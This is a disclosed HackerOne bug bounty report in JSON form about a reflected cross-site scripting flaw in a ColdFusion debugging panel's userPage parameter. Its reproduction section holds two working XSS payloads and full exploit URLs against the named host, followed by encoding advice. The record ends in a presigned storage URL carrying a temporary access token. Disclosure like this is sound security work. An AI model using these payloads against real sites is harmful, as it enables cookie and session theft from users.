{"id":1166918,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTY2OTE4","url":"https://hackerone.com/reports/1166918","title":"Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2021-04-16T19:49:43.244Z","submitted_at":"2021-04-16T19:49:43.486Z","is_member_of_team?":false,"is_organization_group_member?":false,"is_triager?":false,"reporter":{"disabled":false,"username":"ub3rsick","url":"/ub3rsick","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/nfpsdkxk8j5neuevf0nsobxx89nm/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"},"is_me?":false,"cleared":false,"verified":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13428,"url":"https://hackerone.com/acronis","handle":"acronis","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1","medium":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"pentest_retesting_ends_at":null,"profile":{"name":"Acronis","twitter_handle":"Acronis","website":"https://www.acronis.com","about":"Complete integrated cybersecurity and data protection for MSPs and IT teams"}},"has_bounty?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"submitted_by_team_member":false,"submitted_with_assistant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2022-06-14T10:20:47.690Z","bug_reporter_agreed_on_going_public_at":"2022-06-11T16:26:27.681Z","team_member_agreed_on_going_public_at":"2022-06-14T10:20:47.570Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\nThe ColdFusion Debugging Panel exposed at below URL.\n```\nhttp://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=\n```\nThe **userPage** parameter is not properly sanitized and is displayed  without proper output encoding. This results in reflected cross site scripting.\n\n## Steps To Reproduce\n\nEnter any of below payload in the **userPage** parameter and access the URL:\n\n```\nPayload 1: Mouse Over XSS\n---------------------------\n%0d%0a\u003c/script\u003e\u003ch1+onmouseover=alert(document.cookie)\u003eMOUSEOVER_XSS\u003c/h1\u003e\n\n\nPayload 2: \n---------\n%0d%0a\u003c/script\u003e\u003cimg+src=x+onerror=alert(document.domain)\u003e\n\n```\n\nOr Just access below URLs in browser:\n\n```\nhttp://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a\u003c/script\u003e\u003ch1+onmouseover=alert(document.cookie)\u003eMOUSEOVER_XSS\u003c/h1\u003e\n\nhttp://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a\u003c/script\u003e\u003cimg+src=x+onerror=alert(document.domain)\u003e\n\n```\n\n\n## Recommendations\nIt is highly recommended to implement output encoding.\n\nEncode the following characters with HTML entity encoding to prevent switching into any execution context, such as script, style, or event handlers. Using hex entities is recommended in the spec. The 5 characters significant in XML ```(\u0026, \u003c, \u003e, \", ')```:\n```\n \u0026 --\u003e \u0026amp;\n \u003c --\u003e \u0026lt;\n \u003e --\u003e \u0026gt;\n \" --\u003e \u0026quot;\n ' --\u003e \u0026#x27;\n```\n\nReference: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n\n## Impact\n\nXSS can be used to :\n- Steal cookies, password\n- Website Defacement\n- Redirect Victim to Malicious site\n- Log keystrokes etc.","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1268346,"file_name":"GroupLogic-CF_DBG_PANEL_XSS_01.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gdoayu44ehpjs08fbys4fwn4a6wi?response-content-disposition=attachment%3B%20filename%3D%22GroupLogic-CF_DBG_PANEL_XSS_01.png%22%3B%20filename%2A%3DUTF-8%27%27GroupLogic-CF_DBG_PANEL_XSS_01.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRDHA7U5O%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T075440Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECcaCXVzLXdlc3QtMiJIMEYCIQDw2xVM0xQrtM%2BpCBRRcGAsFxMxkxUvvFj5ZEfloWp3DwIhANR0GMGlm5Mrn1%2FNUYJaa8CTv7OGb2ARTuDcXsA3b6NcKrsFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igwq%2BWO8WTMetShBNwkqjwWXHmlWtG6%2BVzLsImovQ1Fn0rBoP6Rq%2Fan47saxr8bjPoqP74Mxz4PsQZYn0ph8Sfxy12WDb%2BUsSbC1M92k7mtKIG18sMQuxaOAom3xt9Q%2BSvB4k5KrOne4Y2sN3bYMVjTwzkEjVhi2J4w5Y5tJ33K25oLuf9z8guqsyVgZnA%2FKWNcF8N%2FqtHmYiLTbZzUh4phpFasmLs9qo4oHbFiRkD9CXE54CKzFzOGA%2F9BKNE1j2JUb2skiqvwDHYh%2FoOKijuTs27F8z6ISAdY7%2Bbf%2FvaeJba%2BJi4qjG8bQKCalnty8zPk0xb5uXrOHft%2F2%2BCanBhkDAjvDQk4FKFI92jtxwozw6rqJG8pjWqNb5QaSiX49jga8EfxyVPSpcIVpwpinlGFpFgIxYM3X%2B%2FZa9ROSYVh8gsPnbpvJgoTDL5v7ZFKDOTmAloNh%2FuYI%2BVG2NGTr4rJwbv8Zz2dEq0Jlhmva34MDLbdz95mXgpN3VvHTK8H5oBiFZxEMJKGLxXpkvlcS%2FlLYNjabb9RHeKgjH0tqOugEuIjSUod2YgX81UFzsa6H%2BjD8Ekn7QWUOjgH3kLis8xjXcwsP2%2FqCQTm9Vdh3Jfnyw9L2565FpNRbfyE9bt3EWwoHFGokDg7sgEPu5OYh6KKxGAvDRDEcmi9EE4L5D89hQmMUH7WBG%2BWYIAvqlwc6n8sitvciblyLqfs1xvXKsmOvhaf7d3UBslLAuaaWKp6TPqw8vWi6UHA6grU1%2FdQ06SanCTt1plCt3SE05thUihjXnXg4aYmt49qhkZUELUeqfFfewuY%2BqHduX4G3eDLXwbiQyPpSQNN3kVNpkjXrCOXhe6OLun%2BJunsNe6vol%2BVgeOuooAyLnqec58DAiU%2FeMO%2Fexs8GOrABXV2k5e9qszFRjj0G1sxBLr0UBWrfPtW